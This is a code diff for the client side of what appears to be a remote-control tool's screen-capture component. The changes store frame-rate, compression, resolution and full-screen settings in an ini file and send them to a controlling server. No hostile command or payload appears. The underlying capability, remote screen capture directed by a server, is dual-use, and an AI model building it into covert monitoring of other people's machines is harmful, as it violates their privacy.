@@ -88,6 +88,18 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
     m_rmouseDown = FALSE;
     m_rclickPoint = {};
     m_rclickWnd = nullptr;
+    iniFile cfg(CLIENT_PATH);
+    int m_nMaxFPS = cfg.GetInt("settings", "ScreenMaxFPS", 20);
+    m_nMaxFPS = max(m_nMaxFPS, 1);
+	int threadNum = cfg.GetInt("settings", "ScreenCompressThread", 0);
+    m_ClientObject->SetMultiThreadCompress(threadNum);
+
+    m_ScreenSettings.MaxFPS = m_nMaxFPS;
+	m_ScreenSettings.CompressThread = threadNum;
+    m_ScreenSettings.ScreenStrategy = cfg.GetInt("settings", "ScreenStrategy", 0);
+	m_ScreenSettings.ScreenWidth = cfg.GetInt("settings", "ScreenWidth", 0);
+	m_ScreenSettings.ScreenHeight = cfg.GetInt("settings", "ScreenHeight", 0);
+	m_ScreenSettings.FullScreen = cfg.GetInt("settings", "FullScreen", 0);
 
     m_hWorkThread = __CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
 }
@@ -380,7 +392,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
         ULONG ulNextSendLength = 0;
         const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
         if (szBuffer) {
-            s0 = max(s0, 1000./This->m_nMaxFPS); // 最快每秒20帧
+            s0 = max(s0, 1000./This->m_ScreenSettings.MaxFPS); // 最快每秒20帧
             s0 = min(s0, 1000);
             int span = s0-(clock() - last);
             Sleep(span > 0 ? span : 1);
@@ -400,7 +412,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
                     s0 = (s0 >= sleep/4) ? s0/alpha : s0;
                     c2 = 0;
 #if _DEBUG
-                    if (1000./s0<This->m_nMaxFPS)
+                    if (1000./s0<This->m_ScreenSettings.MaxFPS)
                         Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
                 }
@@ -418,9 +430,8 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 VOID CScreenManager::SendBitMapInfo()
 {
     //这里得到bmp结构的大小
-    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t);
-    LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL,
-                                            ulLength, MEM_COMMIT, PAGE_READWRITE);
+    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t) + sizeof(ScreenSettings);
+    LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, ulLength, MEM_COMMIT, PAGE_READWRITE);
     if (szBuffer == NULL)
         return;
     szBuffer[0] = TOKEN_BITMAPINFO;
@@ -428,7 +439,7 @@ VOID CScreenManager::SendBitMapInfo()
     memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), sizeof(BITMAPINFOHEADER));
     memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER), &m_conn->clientID, sizeof(uint64_t));
     memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER) + sizeof(uint64_t), &m_DlgID, sizeof(uint64_t));
-    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t), &m_ScreenSettings, sizeof(ScreenSettings));
     m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
     VirtualFree(szBuffer, 0, MEM_RELEASE);
 }
@@ -512,9 +523,19 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         SwitchScreen();
         break;
     }
+	case CMD_FULL_SCREEN: {
+		int fullScreen = szBuffer[1];
+		iniFile cfg(CLIENT_PATH);
+		cfg.SetInt("settings", "FullScreen", fullScreen);
+		m_ScreenSettings.FullScreen = fullScreen;
+		break;
+	}
     case CMD_MULTITHREAD_COMPRESS: {
         int threadNum = szBuffer[1];
         m_ClientObject->SetMultiThreadCompress(threadNum);
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "ScreenCompressThread", threadNum);
+		m_ScreenSettings.CompressThread = threadNum;
         break;
     }
     case CMD_SCREEN_SIZE: {
@@ -535,11 +556,17 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         default:
             break;
         }
+		m_ScreenSettings.ScreenStrategy = strategy;
+		m_ScreenSettings.ScreenWidth = width;
+		m_ScreenSettings.ScreenHeight = height;
         break;
     }
     case CMD_FPS: {
-        m_nMaxFPS = min(255, unsigned(szBuffer[1]));
+        int m_nMaxFPS = min(255, unsigned(szBuffer[1]));
         m_nMaxFPS = max(m_nMaxFPS, 1);
+        iniFile cfg(CLIENT_PATH);
+        cfg.SetInt("settings", "ScreenMaxFPS", m_nMaxFPS);
+		m_ScreenSettings.MaxFPS = m_nMaxFPS;
         break;
     }
     case COMMAND_NEXT: {
